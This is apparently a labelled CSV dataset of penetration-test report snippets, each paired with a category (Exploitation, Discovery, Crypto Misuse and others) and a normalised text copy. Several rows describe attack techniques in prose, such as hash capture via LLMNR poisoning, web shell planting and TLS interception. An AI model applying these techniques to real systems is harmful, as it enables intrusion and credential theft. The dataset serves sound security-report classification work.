text,label,clean_text
**Steps to reproduce**: Execute the injection on the taxid query string parameter.,Exploitation,steps to reproduce execute the injection on the taxid query string parameter
"The house cleaning portions of the assessment ensures that remnants of
the penetration test are removed. Often fragments of tools or user
accounts are left on an organizations computer which can cause security
issues down the road. Ensuring that we are meticulous and no remnants
of our penetration test are left over is important.

After the trophies on both the lab network and exam network were completed,
John removed all user accounts and passwords as well as the Meterpreter
services installed on the system. OffSec should not have to remove any user
accounts or services from the system.",Post - Exploitation,the house cleaning portions of the assessment ensures that remnants of the penetration test are removed often fragments of tools or user accounts are left on an organizations computer which can cause security issues down the road ensuring that we are meticulous and no remnants of our penetration test are left over is important after the trophies on both the lab network and exam network were completed john removed all user accounts and passwords as well as the meterpreter services installed on the system offsec should not have to remove any user accounts or services from the system
"Mobile app failed to enforce HTTPS, exposing login credentials over open Wi-Fi.",Exploitation,mobile app failed to enforce https exposing login credentials over open wifi
"With this we can conclude an answer to Does Tinder correctly implement HTTPS during communication?, namely that the Tinder API uses HTTPS to secure traffic to their service. Although we were able to circumvent this (see section 3.2.1) we had to install a custom root certificate authority on our client devices, which required full administrative control of the devices. Should this be a concern for Tinder they could consider certificate pinning[7].",Support - Recommendation,with this we can conclude an answer to does tinder correctly implement https during communication namely that the tinder api uses https to secure traffic to their service although we were able to circumvent this see section 321 we had to install a custom root certificate authority on our client devices which required full administrative control of the devices should this be a concern for tinder they could consider certificate pinning7
"The organization does not enforce multi-factor authentication for remote VPN access. Although technically supported, the current policy classifies MFA as optional.",Policy,the organization does not enforce multifactor authentication for remote vpn access although technically supported the current policy classifies mfa as optional
Conduct annual tabletop incident response exercises to improve preparedness and identify gaps in coordination.,Support - Recommendation,conduct annual tabletop incident response exercises to improve preparedness and identify gaps in coordination
"User passwords were stored using unsalted MD5 hashes, which can be cracked rapidly using rainbow tables. Stronger, salted algorithms like bcrypt are recommended.",Crypto Misuse,user passwords were stored using unsalted md5 hashes which can be cracked rapidly using rainbow tables stronger salted algorithms like bcrypt are recommended
"The encryption routine used ECB mode, which does not sufficiently protect against block replay attacks. A mode like CBC or GCM should be used instead.",Crypto Misuse,the encryption routine used ecb mode which does not sufficiently protect against block replay attacks a mode like cbc or gcm should be used instead
Used responder to poison LLMNR requests and capture NTLMv2 hashes on the internal network.,Exploitation,used responder to poison llmnr requests and capture ntlmv2 hashes on the internal network
**Active Directory Set**:,Formatting,active directory set
"A global key derivation pattern based on incremental user IDs (e.g., `key = hash(1000 + user_id)`) made it trivial to guess keys for other users.",Crypto Misuse,a global key derivation pattern based on incremental user ids eg key hash1000 user_id made it trivial to guess keys for other users
Finally we settled on an implementation using SSLsplit4. This allowed us to use our own certificate authority to generate proper SSL certificates for any endpoint connected to during our tests. By importing this authority we were able to run the Tinder application while logging all traffic to plaintext files for later inspection. However for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work. ,Discovery,finally we settled on an implementation using sslsplit4 this allowed us to use our own certificate authority to generate proper ssl certificates for any endpoint connected to during our tests by importing this authority we were able to run the tinder application while logging all traffic to plaintext files for later inspection however for a casual attacker this would be highly impractical as we had to manually install the certificate authority and accept severe warnings to get it to work
4.1 Offline analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 6,Formatting,41 offline analysis 6
 Due to incomplete obfuscation of the APK10 file certain resources could easily be identified. The base URL of the Tinder API was also revealed to be https://api.gotinder.com.,Discovery,due to incomplete obfuscation of the apk10 file certain resources could easily be identified the base url of the tinder api was also revealed to be httpsapigotindercom
"An outdated jQuery library (1.7.2) was discovered on the web application, known to be affected by CVE-2015-9251, enabling XSS via cross-domain requests.",Vulnerability - Known CVE,an outdated jquery library 172 was discovered on the web application known to be affected by cve20159251 enabling xss via crossdomain requests
"Planted a Python web shell into an exposed web directory, accessible via an inconspicuous URL, providing command execution through HTTP requests.",Post - Exploitation,planted a python web shell into an exposed web directory accessible via an inconspicuous url providing command execution through http requests
"### Target #1 - 192.168.x.1

#### Service Enumeration

##### Port Scan Results

|IP Address|Ports Open|
|---|---|
|192.168.x.1|**TCP**: 8080<br/>**UDP**: 1433, 3389|",Discovery,target 1 192168x1 service enumeration port scan results ip addressports open 192168x1tcp 8080brudp 1433 3389
4.2.3 Targeting authentication . . . . . . . . . . . . . . . . . 9,Formatting,423 targeting authentication 9
" If it is possible to log in to the Tinder API using a random access token from another application this may enable third parties to profile users of Tinder or manipulate existing contacts, current recommendations, and chat conversations",Discovery,if it is possible to log in to the tinder api using a random access token from another application this may enable third parties to profile users of tinder or manipulate existing contacts current recommendations and chat conversations
Attackers reused session tokens from stolen browser sessions to bypass login.,Exploitation,attackers reused session tokens from stolen browser sessions to bypass login
User tokens remain valid after logout or password reset.,Implementation Flaw,user tokens remain valid after logout or password reset
 To complete our MitM setup we needed to proxy HTTP(S) requests and fake certificates for the various requested web resources. Because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the WiFi settings. Reason for this is that applications on Android don't use the proxy as configured in the WiFi settings. As such we required a proxy which could generate SSL certificates for the various end-points requested by the application. ,Discovery,to complete our mitm setup we needed to proxy https requests and fake certificates for the various requested web resources because we wanted to analyze all requests we chose to set our proxy in transparent setup as opposed to defining the proxy in the wifi settings reason for this is that applications on android dont use the proxy as configured in the wifi settings as such we required a proxy which could generate ssl certificates for the various endpoints requested by the application
"The password hashing implementation used `Math.random()` to generate salts. This method is not cryptographically secure and could lead to predictable salts, allowing precomputed dictionary attacks using rainbow tables.",Crypto Misuse,the password hashing implementation used mathrandom to generate salts this method is not cryptographically secure and could lead to predictable salts allowing precomputed dictionary attacks using rainbow tables
"The login endpoint does not implement rate limiting, allowing attackers to brute force credentials without restriction.",Implementation Flaw,the login endpoint does not implement rate limiting allowing attackers to brute force credentials without restriction
1http://forum.xda-developers.com/showthread.php?t=1910873,Support - Tool Reference,1httpforumxdadeveloperscomshowthreadphpt1910873
 ## Offensive Security OSCP Exam Penetration Test Report The OffSec Lab and Exam penetration test report contains all efforts that were conducted in order to pass the OffSec course. This report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam. The purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the OffSec Certified Professional.,Background Information,offensive security oscp exam penetration test report the offsec lab and exam penetration test report contains all efforts that were conducted in order to pass the offsec course this report should contain all items that were used to pass the overall exam and it will be graded from a standpoint of correctness and fullness to all aspects of the exam the purpose of this report is to ensure that the student has a full understanding of penetration testing methodologies as well as the technical knowledge to pass the qualifications for the offsec certified professional
Exported entire customer database from a misconfigured public S3 bucket.,Operational TTPs,exported entire customer database from a misconfigured public s3 bucket
"During invalid input processing, the system throws unhandled exceptions that leak internal stack trace information to the client.",Implementation Flaw,during invalid input processing the system throws unhandled exceptions that leak internal stack trace information to the client
Revealing software versions or internal IPs via headers like Server: or X-Powered-By.,Information Disclosure,revealing software versions or internal ips via headers like server or xpoweredby
3.1 Static analysis . . . . . . . . . . . . . . . . . . . . . . . . . . 4,Formatting,31 static analysis 4
4.2.2 Insecure traffic . . . . . . . . . . . . . . . . . . . . . . 8,Formatting,422 insecure traffic 8
The static analysis of the Tinder application was by decompiling the source files from a retrieved APK file using APK to Java1. This APK file has been retrieved from a rooted android device. The decompiler used was the freely available jd-gui[4].,Discovery,the static analysis of the tinder application was by decompiling the source files from a retrieved apk file using apk to java1 this apk file has been retrieved from a rooted android device the decompiler used was the freely available jdgui4
Local enumeration revealed a SUID binary /usr/bin/vulnprog with improper bounds checking. Exploiting a buffer overflow allowed escalation to root.,Privilege Escalation,local enumeration revealed a suid binary usrbinvulnprog with improper bounds checking exploiting a buffer overflow allowed escalation to root
"Compromised Jenkins pipeline through script console, allowing arbitrary code to run on build agents.",Exploitation,compromised jenkins pipeline through script console allowing arbitrary code to run on build agents
"This attack shows that it is possible to write a simple chat bot, even if
you would have to resort to someone manually creating matches with other
users. There are strong indicators that spam bots are active on Tinder [8],
we suspect that automation like we demonstrated is used for these purposes.",Exploitation,this attack shows that it is possible to write a simple chat bot even if you would have to resort to someone manually creating matches with other users there are strong indicators that spam bots are active on tinder 8 we suspect that automation like we demonstrated is used for these purposes
8http://www.kontagent.com/,Support - Tool Reference,8httpwwwkontagentcom
"Some issues remain, including third-party analytics receiving sensitive data over insecure channels.",Exploitation,some issues remain including thirdparty analytics receiving sensitive data over insecure channels
"In this paper we will look in to the risks of using Tinder, what information is sent where and how securely this information is transported over the internet. We also look into whether information is stored at a third party or even Tinder itself. ",Background Information,in this paper we will look in to the risks of using tinder what information is sent where and how securely this information is transported over the internet we also look into whether information is stored at a third party or even tinder itself
Abused overly permissive IAM roles to escalate privileges in AWS environment.,Privilege Escalation,abused overly permissive iam roles to escalate privileges in aws environment
Exposed Jenkins dashboard allowed anonymous command execution on build nodes.,Exploitation,exposed jenkins dashboard allowed anonymous command execution on build nodes
Passwordmaker uses charAt() which could be exploited in a side-channel attack.,Discovery,passwordmaker uses charat which could be exploited in a sidechannel attack
MySQL service allowed login with root and no password.,Credential Access,mysql service allowed login with root and no password
Company policy allows unrestricted access to production databases by all developers. This contradicts the principle of least privilege and exposes sensitive data to potential abuse.,Policy,company policy allows unrestricted access to production databases by all developers this contradicts the principle of least privilege and exposes sensitive data to potential abuse
Accessed internal documentation from exposed Confluence server using default credentials.,Credential Access,accessed internal documentation from exposed confluence server using default credentials
"{Joris.Claassen,Leendert.vanDuijn,Mick.Pouw,Esan.Wit}@os3.nl",Background Information,jorisclaassenleendertvanduijnmickpouwesanwitos3nl
4.2 Dynamic analysis . . . . . . . . . . . . . . . . . . . . . . . . . 7,Formatting,42 dynamic analysis 7
User was tricked into clicking a link that appeared to belong to their company domain but led to a malicious site that stole credentials.,Exploitation,user was tricked into clicking a link that appeared to belong to their company domain but led to a malicious site that stole credentials
